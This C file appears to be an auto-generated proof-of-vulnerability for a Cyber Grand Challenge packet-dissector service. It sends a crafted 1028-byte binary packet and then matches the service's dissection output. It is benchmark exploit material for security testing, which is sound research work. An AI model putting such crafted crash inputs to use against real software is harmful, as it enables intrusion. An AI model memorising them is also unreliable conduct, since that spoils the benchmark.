#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x39\xe5\x88\x80"
         "\xb2\x09\x66\xb1\xfd\xb5\xbf\x80\x65\x2d\x8a\x23\x0b\x2a\xc8\xed"
         "\xdb\x00\x00\x00\x24\xe0\x06\xe0\x37\x98\x12\xf4\x77\x57\xac\x73"
         "\x20\xac\x58\x60\x97\x5b\x89\x7a\x09\x09\x00\x09\x47\xe4\xac\x0b"
         "\xc5\xa4\x23\xcc\xb8\xfc\x95\x25\x3c\x16\xc6\xe2\xd2\xea\x52\xb4"
         "\xd6\xac\x46\x96\xc9\x28\xde\xd6\x74\xaf\x33\xaf\x1b\x30\x65\x39"
         "\x2e\xf4\x97\xa6\x48\x27\x1b\x75\xed\xf3\xec\xa0\xfb\xf8\x3f\x14"
         "\xb4\x4c\x3b\x0a\x6e\xe0\x1c\xb2\xa0\x00\x98\x18\x86\x8f\x7f\x04"
         "\xc5\x51\x90\x86\x24\x37\xdf\xe7\xa2\x4b\xb6\xae\xdd\x8a\xd0\x8b"
         "\xc7\x77\xba\x7a\xf2\x84\xa6\x4a\x99\x23\xa4\x5c\xba\x24\xed\xbf"
         "\xe7\xee\x41\xa6\x58\xb1\x15\xde\xae\xa7\x0d\x84\x0a\xe3\x39\x1a"
         "\x3c\xc5\x6c\xaf\xb5\x7a\x47\x55\x61\xd0\xfa\x26\x71\x43\x12\x84"
         "\x35\x00\x0c\x03\xeb\xaa\xdd\x73\x82\xfe\x3b\x4c\xb9\x51\x31\x7f"
         "\x3d\x48\x30\x31\x68\x2f\x8b\x6a\x16\x72\xdd\x42\x2e\x71\x6b\x3e"
         "\xf5\x6f\x33\x70\x7f\x5e\xeb\xd9\xbc\xc3\xf5\x8e\x66\x88\xd7\x0f"
         "\x6a\x40\xe4\xf8\xfc\xa1\xb7\x26\x53\xbd\xc5\x88\xbc\x8a\x13\x1a"
         "\xb8\x32\xca\x38\x8a\x09\x3f\x12\xe4\xbb\x45\xc4\x5c\x27\x65\x77"
         "\x3b\x66\xd8\x7f\xe8\xf6\x05\x65\xb6\x49\xc4\x64\x5e\xe8\x04\x09"
         "\x00\xd5\xfd\xf3\xec\x83\x14\xe9\xe0\x09\x89\xff\x5f\x3e\x1b\x90"
         "\x02\x00\xf4\xd0\xae\xe5\x49\x3d\xe3\xe0\xea\xdd\xa2\x1b\xd7\x66"
         "\xe1\x58\xa5\x45\xc0\xbb\xe5\x4b\xb5\xfe\x20\x2f\x18\xc4\xb0\xe9"
         "\xb6\x40\x48\x58\xcb\x6d\x11\xa4\x1c\x73\x82\xbb\xde\xf5\xac\x9c"
         "\xfe\x14\xe0\xfb\xa1\x12\xa7\xa1\x5f\x8b\x7e\xa2\xee\x47\xf2\x30"
         "\x74\xad\xcc\xcf\x9e\x7b\x40\xdb\x2a\x86\x1b\xb6\xf8\x2b\x03\xc5"
         "\x77\xfe\x33\x41\xfd\x9c\xab\xba\x18\xce\xa0\xd7\xe9\x2c\xcc\xd6"
         "\xa9\xc4\x37\xee\x0b\xc7\x31\xeb\x2d\x05\x17\x43\x5a\xc5\x91\x52"
         "\xd7\x6c\x4c\x30\x5a\xe5\x10\x9b\xe4\xf2\xca\x42\x3f\x29\xa1\x67"
         "\x56\xf9\x06\x73\xe2\x56\xa9\xee\x92\x6b\x40\x53\xbe\x54\x4a\x0f"
         "\x28\x8f\xd2\xeb\xbb\x59\x25\xb1\x38\x4e\x21\xdb\x9a\xe9\x4e\x7d"
         "\x04\xc5\x47\x59\x12\xd9\x5c\x95\x95\x55\xba\x27\x51\x96\x51\x49"
         "\xd8\x09\x49\x58\xbc\xdf\x49\x34\x80\xdb\x6a\x33\x80\xb4\x20\x96"
         "\x17\x6e\xc5\xcb\xce\x05\x57\xe9\x95\x63\xb7\xc2\x07\x8e\x97\xaf"
         "\x37\xaf\x63\x53\x34\x0a\xc5\x32\xa5\xb7\x6e\x43\x55\xf9\x67\x1a"
         "\x35\xec\xd2\x58\x75\xa3\xe4\x0b\x35\xa3\xe4\xd9\x8c\xfd\x2a\xae"
         "\xcd\x5c\x45\x6c\xf5\x81\xa1\xfc\xd1\x5f\xd9\xa5\xbc\xf0\x28\xe6"
         "\xbc\x8c\x11\xe8\x8e\x7e\x16\xd7\x94\xf1\x82\x6c\x62\x67\x3a\xae"
         "\x31\x3a\xfe\xe6\x95\xe2\x22\x43\x2b\x7d\xbb\xb4\x4c\x2e\x0a\x9a"
         "\xce\x0a\x09\x00\x62\xa5\xde\xdd\x07\x41\xcc\x3e\xdd\x5b\x12\xbd"
         "\xef\xc0\x1d\x33\x7b\xd2\xc3\xef\x6e\x91\x94\x78\x83\xbd\x31\xb4"
         "\x99\x83\x24\xdc\x23\xd5\xf5\xae\xa2\xec\x3d\x9a\xb4\x97\xaf\xdb"
         "\xe6\xa4\xa2\x6a\x14\x11\x3c\x4d\x02\x66\xec\xfe\x4c\xcc\x9a\xe5"
         "\xa8\xcb\x24\x9c\x96\x68\x4f\xb2\x31\x61\x45\x87\xe8\x46\x89\xc7"
         "\xf0\x00\x14\x8b\x3c\x89\x00\x7a\x2e\x51\x8a\xe7\x04\x34\x30\xec"
         "\xe0\x83\x99\xba\x90\xdc\x9b\x75\xe1\x79\x91\x78\x4d\x09\x6c\xb2"
         "\xf7\x32\xa0\xfd\x35\xba\x79\xf9\x92\x2e\xfc\x9c\xdd\xd5\xda\xd5"
         "\xb7\x87\x75\xd4\x58\x08\x5a\x1d\xf1\xd0\xfa\x4a\x3e\x40\x01\xf1"
         "\x94\x64\xcb\x53\x7a\x6a\x7b\x31\x1b\x42\x77\xf4\x44\xc8\xad\xaf"
         "\x35\xd3\x1e\xa9\xab\x27\xae\x8a\x1f\x24\x33\xba\x6c\x1d\x14\x5f"
         "\x51\x7b\xee\xb1\x6e\xed\x9b\x17\x2e\xcf\x3c\x0a\x87\xcd\x16\x1a"
         "\xb1\x8d\xe2\x7b\x49\x8f\x21\xa4\xa7\x19\x4a\x7e\xd6\x48\xec\x85"
         "\xfc\xcf\x6e\xa6\xf6\x26\xd8\x19\x4e\x99\x71\xf3\xfc\xba\xa5\x4a"
         "\xa6\xc9\x3a\x1f\xb9\x86\xea\x04\x50\xe2\xc8\x7e\x11\x74\x48\xa8"
         "\xf8\x23\xe5\xa6\xaf\x82\xf2\x17\x8b\x8a\x20\x4f\xe3\xff\x32\x00"
         "\x38\x17\xdf\x1b\xae\xf7\x33\xc7\xc5\x6a\xe1\x5a\x16\x24\xbe\xde"
         "\xab\x96\xac\xff\xb5\x39\x40\x81\x00\x8c\xb7\x9d\x5e\x8c\xc3\x7c"
         "\x39\xb5\xe4\xba\xf7\x4c\xce\x6f\x48\x1d\xd7\x39\x6e\x73\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===limsypersistence
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x69\x6d\x73\x79\x70\x65\x72\x73\x69\x73"
         "\x74\x65\x6e\x63\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
